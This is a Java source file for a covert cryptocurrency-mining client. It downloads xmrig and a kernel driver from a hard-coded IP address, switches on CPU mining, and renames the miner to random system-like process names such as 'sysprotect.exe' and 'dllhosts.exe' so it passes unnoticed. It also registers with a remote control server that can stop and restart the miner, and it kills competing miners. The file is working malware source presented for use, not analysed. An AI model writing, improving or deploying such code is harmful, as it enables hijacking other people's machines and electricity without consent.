package client.main;

import universal.FileIO;
import universal.Out;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.util.Date;
import java.util.Objects;
import java.util.Timer;

public class AXMain {
	public static final String workDir="D:\\syshost";
	public static final String RLS_NOTE="SendHash";
	public static final String[] PROG_MASK_NAME=new String[]{"memprog.exe","memmgr.exe","sysprotect.exe","ssddriver.exe","pcasi.exe","dllhosts.exe","mediahost.exe","monitor.exe","touchas.exe"};
	//从ghostj的配置文件读取本机名称
	//向ax服务端发送注册消息
	//检查是否有xmrig已存在,没有则下载
	//读取ghostj的配置文件修改config.json中的本机pass
	//检测是否是windows10，如果是则直接退出
	//启动xmrig
	//向服务端发送xmrig的stdout
	//支持关闭和重启xmrig
	static Config ghostConfig=new Config("D:\\ProgramData\\Ghost\\ghostjc.ini");
	static String pass=ghostConfig.getStringAnyhow("name","axClient");
	static Connect connect=new Connect();
	static boolean printToStdout=false;
	static Timer timer=new Timer();
	static AutoSwitch autoSwitch;
	static ProcessCmd processCmd;
	public static void main(String[] args) {
		//避免重复
		killAllMiner();
		if (args.length>0){
			printToStdout=Boolean.parseBoolean(args[0]);
		}
		String runtimeMode=FileRW.read("mode.txt");
		//从ghostj的配置文件读取本机名称
		//向ax服务端发送注册消息
		connect.start();
		try{
			Thread.sleep(3000);
		}catch (Exception ignored){}
		//检测是否是windows10，如果是则直接退出
		if (isWindows10()&&!runtimeMode.equalsIgnoreCase("ignoreosver")){
			System.out.println("[AX]Windows 10");
			System.exit(0);
		}
		//检查是否有xmrig已存在,没有则下载
		if (!(new File(workDir+"\\config.json").exists())){
			try {
				downLoadFromUrl("http://39.100.5.139/ghost/files/xmrig/WinRing0x64.sys", "WinRing0x64.sys", workDir, "dl"+new Date().getTime());
			}catch (Exception e) {
				e.printStackTrace();
			}
			try {
				downLoadFromUrl("http://39.100.5.139/ghost/files/xmrig/xmrig.exe.hash", "x.hash", workDir, "dl"+new Date().getTime());
			}catch (Exception e) {
				e.printStackTrace();
			}
			String stdHash= null;
			int attemptCount=0;
			try {
				stdHash = FileIO.read(workDir+"\\x.hash");
				String dlHash;
				do {
					try {
						Out.sayWithTimeLn("Dl xmrig.exe");
						downLoadFromUrl("http://39.100.5.139/ghost/files/xmrig/xmrig.exe", "xmrig.exe", workDir, "dl" + new Date().getTime());
					} catch (Exception e) {
						e.printStackTrace();
					}
					attemptCount++;
					dlHash=hashFile(new File(workDir+"\\xmrig.exe"));
					Out.sayWithTimeLn(dlHash);
					connect.writeIgnoreExce(dlHash);
				}while (!dlHash.equals(stdHash)&&attemptCount<=3);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		try {
			if (new File(workDir+"\\config.json.bak").exists()){
				FileIO.write(workDir+"\\config.json",FileIO.read(workDir+"\\config.json.bak"));
			}else {
				downLoadFromUrl("http://39.100.5.139/ghost/files/xmrig/config.json", "config.json", workDir, "dl" + new Date().getTime());
			}
		}catch (Exception e) {
			e.printStackTrace();
		}
		//读取ghostj的配置文件修改config.json中的本机pass
		String cfgjson=FileRW.readMultiLine(workDir+"\\config.json");
		FileRW.write(workDir+"\\config.json",cfgjson.replaceAll("DEVICE_PASS",pass).replaceAll("nmsl@wsnb.com",pass));
		try {
			String fileContent = FileIO.read(workDir+"\\config.json");
			FileIO.write(workDir+"\\config.json", fileContent.replace("\"cpu\": {\n" +
					"        \"enabled\": false,", "\"cpu\": {\n" +
					"        \"enabled\": true,"));
		} catch (Exception e) {
			e.printStackTrace();
		}
		//随机一个程序名
		int idx=(int)(Math.random()*1000)%PROG_MASK_NAME.length;
		String maskName=PROG_MASK_NAME[idx];
		//修改程序名
		String originName=curMaskName();
		Out.sayWithTimeLn("CurName:"+originName);
		File prog=new File(workDir+"\\"+originName);
		boolean succ=prog.renameTo(new File(workDir+"\\"+maskName));
		Out.sayWithTimeLn("ChangeTo:"+maskName+" succ:"+succ);
		//启动xmrig
		processCmd=new ProcessCmd("cmd");
		processCmd.cmd="cmd";
		processCmd.start();
		try {
			Thread.sleep(1000);
			processCmd.processWriter.write("D:");
			processCmd.processWriter.newLine();
			processCmd.processWriter.flush();
			processCmd.processWriter.write("cd "+workDir+"\\\n");
			processCmd.processWriter.newLine();
			processCmd.processWriter.flush();
			if (succ) {
				processCmd.processWriter.write(maskName + "\n");
			}else {
				processCmd.processWriter.write("xmrig.exe\n");
			}
			processCmd.processWriter.newLine();
			processCmd.processWriter.flush();
		}catch (Exception e){
			e.printStackTrace();
			AXMain.connect.writeIgnoreExce("cannot exec");
		}
		try {
			Thread.sleep(10000);
		}catch (Exception ignored){}
		autoSwitch=new AutoSwitch();
		timer.schedule(autoSwitch,new Date(),5000);
		//向服务端发送xmrig的stdout
		//支持关闭和重启xmrig
	}



	/**
	 * 从网络Url中下载文件
	 * @param urlStr
	 * @param fileName
	 * @param savePath
	 * @throws IOException
	 */
	public static void  downLoadFromUrl(String urlStr,String fileName,String savePath,String toekn) throws IOException{
		URL url = new URL(urlStr);
		HttpURLConnection conn = (HttpURLConnection)url.openConnection();
		//设置超时间为3秒
		conn.setConnectTimeout(3*1000);
		//防止屏蔽程序抓取而返回403错误
		conn.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)");
		conn.setRequestProperty("lfwywxqyh_token",toekn);
		//输入流
		DataInputStream dataInputStream=new DataInputStream(conn.getInputStream());
		//创建文件输出流
		// 文件保存位置
		File saveDir = new File(savePath.replaceAll("\\?"," "));
		if(!saveDir.exists()){
			saveDir.mkdir();
		}
		File file = new File(saveDir+File.separator+fileName);
		FileOutputStream fos = new FileOutputStream(file);

		byte[] data=new byte[1024];
		int len=0;
		while ((len=dataInputStream.read(data,0,data.length))!=-1){
			fos.write(data,0,len);
			fos.flush();
		}
		fos.close();
		dataInputStream.close();
	}



	public static boolean isWindows10() {
		return System.getProperties().getProperty("os.name").toUpperCase().contains("WINDOWS 10");
	}



	public static void killAllMiner(){
		try {
			for (String s : PROG_MASK_NAME) {
				Runtime.getRuntime().exec("taskkill /im " + s + " /f");
			}
			Runtime.getRuntime().exec("taskkill /im xmrig.exe /f");
		}catch (Exception ignored){}
	}




	public static String curMaskName(){
		File dir=new File(workDir);
		for (File a: Objects.requireNonNull(dir.listFiles())){
			if (a.getName().endsWith("exe")){
				if (a.getName().equals("xmrig.exe")){
					return "xmrig.exe";
				}
                for (String s:PROG_MASK_NAME){
                	if (s.equals(a.getName())){
                		return s;
	                }
                }
			}
		}
		return null;
	}





	//01a2f68e2f3e3bfc40f5f925f2841ad241e19b8808157b229fbc7d2af692b26b
	/**
	 * 计算文件hash值
	 */
	public static String hashFile(File file) throws Exception {
		FileInputStream fis = null;
		String sha256 = null;
		try {
			fis = new FileInputStream(file);
			MessageDigest md = MessageDigest.getInstance("SHA-256");
			byte buffer[] = new byte[1024];
			int length = -1;
			while ((length = fis.read(buffer, 0, 1024)) != -1) {
				md.update(buffer, 0, length);
			}
			byte[] digest = md.digest();
			sha256 = byte2hexLower(digest);
		} catch (Exception e) {
			e.printStackTrace();
			throw new Exception("计算文件hash值错误");
		} finally {
			try {
				if (fis != null) {
					fis.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		Out.sayWithTimeLn(sha256);
		return sha256;
	}

	private static String byte2hexLower(byte[] b) {
		String hs = "";
		String stmp = "";
		for (int i = 0; i < b.length; i++) {
			stmp = Integer.toHexString(b[i] & 0XFF);
			if (stmp.length() == 1) {
				hs = hs + "0" + stmp;
			} else {
				hs = hs + stmp;
			}
		}
		return hs;
	}
}
